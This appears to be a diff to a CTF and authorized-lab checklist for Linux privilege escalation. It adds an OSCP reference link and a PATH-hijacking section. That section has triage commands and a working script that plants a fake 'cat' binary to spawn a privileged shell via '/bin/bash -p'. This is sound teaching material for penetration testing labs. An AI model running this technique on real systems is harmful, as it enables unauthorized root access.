@@ -4,6 +4,8 @@ Generic Linux boot2root checklist for authorized labs and CTF environments.
 
 Extra local reference: [Local Linux Enumeration & Privilege Escalation](../references/Local%20Linux%20Enumeration%20%26%20Privilege%20Escalation.md)
 
+OSCP module source map: [OSCP Module Map](../references/OSCP%20Module%20Map.md#linux-module).
+
 Related alternatives:
 
 - [Service Enumeration Alternatives](../tools/Service%20Enumeration%20Alternatives.md)
@@ -307,6 +309,26 @@ If a sudo script calls binaries without absolute paths:
 2. Place a fake binary with the expected name.
 3. Prepend that directory to `PATH` during the sudo call if permitted.
 4. Use the root context to create a controlled privilege escalation path.
+
+Quick triage:
+
+```bash
+echo $PATH
+which cat
+strings ./suspect-binary | grep -E 'cat|cp|tar|sh|bash|python|find'
+grep -R "system(" -n . 2>/dev/null
+```
+
+Lab proof pattern:
+
+```bash
+mkdir -p /tmp/pathlab
+printf '#!/bin/sh\nid > /tmp/pathlab.proof\n/bin/bash -p\n' > /tmp/pathlab/cat
+chmod +x /tmp/pathlab/cat
+PATH=/tmp/pathlab:$PATH ./suspect-binary
+```
+
+This only works when the privileged process calls `cat` without an absolute path and preserves or accepts the attacker-controlled `PATH`.
 
 ### Cron Abuse
 
